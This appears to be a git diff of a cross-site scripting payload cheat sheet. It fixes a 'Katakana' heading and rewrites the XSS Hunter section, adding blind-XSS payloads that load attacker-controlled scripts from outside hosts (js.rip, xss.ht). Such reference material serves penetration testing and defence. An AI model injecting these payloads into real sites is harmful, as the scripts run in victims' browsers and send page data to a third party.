@@ -62,7 +62,7 @@
     - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
     - [Bypass ";" using another character](#bypass--using-another-character)
     - [Bypass using HTML encoding](#bypass-using-html-encoding)
-    - [Bypass using Katana](#bypass-using-katana)
+    - [Bypass using Katakana](#bypass-using-katakana)
     - [Bypass using Cuneiform](#bypass-using-cuneiform)
     - [Bypass using Lontara](#bypass-using-lontara)
     - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
@@ -518,13 +518,18 @@ document.getElementById('btn').onclick = function(e){
 
 ### XSS Hunter
 
-XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). You can set up an alternative version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
-
 > XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.
 
+XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app). 
+
+You can set up an alternative version 
+* Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
+* Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
+
 ```xml
-"><script src=//<your.subdomain>.xss.ht></script>
-<script>$.getScript("//<your.subdomain>.xss.ht")</script>
+"><script src="https://js.rip/<custom.name>"></script>
+"><script src=//<custom.subdomain>.xss.ht></script>
+<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
 ```
 
 ### Other Blind XSS tools
@@ -970,7 +975,7 @@ Unicode Character U+FF1C and U+FF1E
 ></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
 ```
 
-### Bypass using Katana
+### Bypass using Katakana
 
 Using the [Katakana](https://github.com/aemkei/katakana.js) library.
 
